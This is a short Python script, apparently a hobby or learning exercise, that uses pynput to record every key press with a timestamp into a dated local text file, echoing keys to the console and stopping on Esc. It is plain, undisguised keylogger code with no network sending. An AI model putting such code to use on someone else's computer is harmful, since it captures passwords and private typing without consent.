import listener
import pynput
from datetime import datetime
import pytz
from pynput.keyboard import Key, Listener

cdt = datetime.now().date()
EST = pytz.timezone('US/Eastern')
local_time = datetime.now(EST).time()

def on_press(key):
    write_file(key)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(key):
    with open(f'{cdt} Key Logs for {local_time}.txt', 'a') as f:
        f.write(f"({datetime.now()}) {key} pressed\n")

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()